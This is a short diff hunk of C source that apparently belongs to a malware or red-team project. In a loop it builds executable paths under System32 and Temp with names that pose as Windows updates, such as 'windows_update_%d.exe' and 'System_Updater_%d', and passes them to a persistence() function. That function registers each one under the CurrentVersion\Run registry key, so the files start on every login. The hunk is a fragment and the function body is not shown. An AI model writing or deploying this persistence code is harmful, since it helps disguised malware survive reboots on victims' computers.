@@ -45,13 +45,13 @@ int main(){
         char buf[250];
         char name_buf[250];
         if(i % 2 == 0){
-            snprintf(buf, sizeof(buf), "C:\\Windows\\System32\\updater_%d.exe", i);
-            snprintf(name_buf, sizeof(name_buf), "System_Updater_%d", i);
+            snprintf(buf, sizeof(buf)-1, "C:\\Windows\\System32\\windows_update_%d.exe\0", i);
+            snprintf(name_buf, sizeof(name_buf)-1, "C:\\Windows\\System32\\System_Updater_%d.exe\0", i);
             persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf, name_buf);
         }
         else{
-            snprintf(buf, sizeof(buf), "C:\\Windows\\Temp\\windows_update_%d.exe", i);
-            snprintf(name_buf, sizeof(name_buf), "Update_%d", i);
+            snprintf(buf, sizeof(buf)-1, "C:\\Windows\\Temp\\windows_update_%d.exe\0", i);
+            snprintf(name_buf, sizeof(name_buf)-1, "Update_%d\0", i);
             persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run", buf, name_buf);
         }
        
